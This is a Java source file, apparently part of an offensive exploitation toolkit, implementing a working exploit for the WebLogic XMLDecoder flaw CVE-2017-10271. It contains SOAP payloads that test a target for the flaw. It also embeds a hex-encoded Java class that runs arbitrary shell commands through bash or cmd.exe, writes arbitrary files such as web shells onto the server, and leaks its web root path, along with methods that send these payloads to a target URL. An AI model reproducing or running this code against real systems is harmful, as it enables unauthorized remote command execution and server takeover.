/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.js.codeexec.paylaod;

import com.js.codeexec.tools.HttpTool;
import java.util.Random;

/**
 *
 * @author shack2
 */
public class CVE_2017_10271_10 implements BasePayload {
    private static final String CheckStr="xmldecoder_vul_test"; 
    private static final String VULURL="/wls-wsat/CoordinatorPortType11";
    private static final String FileAbsPath="/wls-wsat/"; 
    private static final String UploadCheckStr="xml_upload_ok";
    
    private static String Check_VUL="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
"    <soapenv:Header>\n" +
"        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
"            <java>\n" +
"                <void class=\"java.lang.Thread\" method=\"currentThread\">\n" +
"                    <void method=\"getCurrentWork\">\n" +
"                        <void method=\"getResponse\">\n" +
"                            <void method=\"getServletOutputStream\">\n" +
"                                <void method=\"flush\"/>\n" +
"                            </void>\n" +
"                            <void method=\"getWriter\"><void method=\"write\"><string>"+CheckStr+"</string></void></void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n" +
"            </java>\n" +
"        </work:WorkContext>\n" +
"    </soapenv:Header>\n" +
"    <soapenv:Body/>\n" +
"</soapenv:Envelope>";
    
    private static String VUL_CMD="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
"    <soapenv:Header>\n" +
"        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
"            <java>\n" +
"                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string>0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034</string>\n" +
"                </void>\n" +
"                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n" +
"                    <void method=\"defineClass\">\n" +
"                        <string>com.supeream.exploits.XmlExp</string>\n" +
"                        <object idref=\"cls\"></object>\n" +
"                        <void method=\"newInstance\">\n" +
"                            <void method=\"say\" id=\"proc\">\n" +
"                                <string>%s</string>\n" +
"                            </void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n" +
"                <void class=\"java.lang.Thread\" method=\"currentThread\">\n" +
"                    <void method=\"getCurrentWork\">\n" +
"                        <void method=\"getResponse\">\n" +
"                            <void method=\"getServletOutputStream\">\n" +
"                                <void method=\"writeStream\">\n" +
"                                    <object idref=\"proc\"></object>\n" +
"                                </void>\n" +
"                                <void method=\"flush\"/>\n" +
"                            </void>\n" +
"                            <void method=\"getWriter\"><void method=\"write\"><string></string></void></void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n" +
"            </java>\n" +
"        </work:WorkContext>\n" +
"    </soapenv:Header>\n" +
"    <soapenv:Body/>\n" +
"</soapenv:Envelope>";
    
    private static Random  rand=new Random();
    private static String UploadFile_VUL_WebPath="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getContext\"><void method=\"getRootTempDir\"><void method=\"getAbsolutePath\"><void method=\"concat\" id=\"path\"><string>/war/%s</string></void></void></void></void></void></void><object class=\"java.io.PrintWriter\"><object idref=\"path\"></object><void method=\"println\"><string><![CDATA[%s]]></string></void><void method=\"close\"/></object><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getServletOutputStream\"><void method=\"flush\"/></void><void method=\"getWriter\"><void method=\"write\"><string>"+UploadCheckStr+"</string></void></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
    private static String UploadFile_VUL_UserPath="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><object class=\"java.io.PrintWriter\"><string>%s</string><void method=\"println\"><string><![CDATA[%s]]></string></void><void method=\"close\"/></object><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getServletOutputStream\"><void method=\"flush\"/></void><void method=\"getWriter\"><void method=\"write\"><string>"+UploadCheckStr+"</string></void></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
    private static String Path_VUL="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
"<java>\n" +
"<void class=\"java.lang.Thread\" method=\"currentThread\">\n" +
"	<void method=\"getCurrentWork\">\n" +
"        <void method=\"getContext\">\n" +
"            <void method=\"getRootTempDir\">\n" +
"                <void method=\"getAbsolutePath\">\n" +
"                    <void method=\"concat\" id=\"path\">\n" +
"                        <string>\\war</string>\n" +
"                    </void>\n" +
"                </void>\n" +
"            </void>\n" +
"        </void>\n" +
"    </void>\n" +
"</void> <void class=\"java.lang.Thread\" method=\"currentThread\">\n" +
"                    <void method=\"getCurrentWork\">\n" +
"                        <void method=\"getResponse\">\n" +
"                            <void method=\"getServletOutputStream\">\n" +
"                                <void method=\"flush\"/>\n" +
"                            </void>\n" +
"                            <void method=\"getWriter\"><void method=\"write\"><string idref=\"path\"></string></void></void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n\n" +
"</java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
    
    
    @Override
    public boolean checkVUL(String url) throws Exception{ 
        try {         
            String result=HttpTool.postHttpReuestByXML(url+VULURL, Check_VUL,"UTF-8");
            if(CheckStr.equals(result)){
                    return true;
            }
        } catch (Exception e) {
           throw e;
        }
        return false;
        
    }

    @Override
    public String exeCMD(String url, String cmd,String encoding)  throws Exception{
        try {
           
            String payload=String.format(VUL_CMD, cmd);
            return HttpTool.postHttpReuestByXML(url+VULURL, payload,encoding);
        } catch (Exception e) {
           throw e;
        }

    }

    @Override
    public String uploadFile(String url,String fileContent, String filename,boolean useUserPath) throws Exception{
         try {
            String payload="";
            String respath=filename;
            if(useUserPath){
                 respath=filename;
                payload=String.format(UploadFile_VUL_UserPath, filename,fileContent);
            }
            else{
                respath=url+FileAbsPath+filename;
                payload=String.format(UploadFile_VUL_WebPath,filename,fileContent);
            }
            String result=HttpTool.postHttpReuestByXML(url+VULURL, payload,"UTF-8");
            if(UploadCheckStr.equals(result)){
                    return respath;
            }
            
        } catch (Exception e) {
           throw e;
        }
        return "";
    }

    @Override
    public String getWebPath(String url) throws Exception {
        try {
            return HttpTool.postHttpReuestByXML(url+VULURL, Path_VUL,"UTF-8");
        } catch (Exception e) {
           throw e;
        }
    }
    
}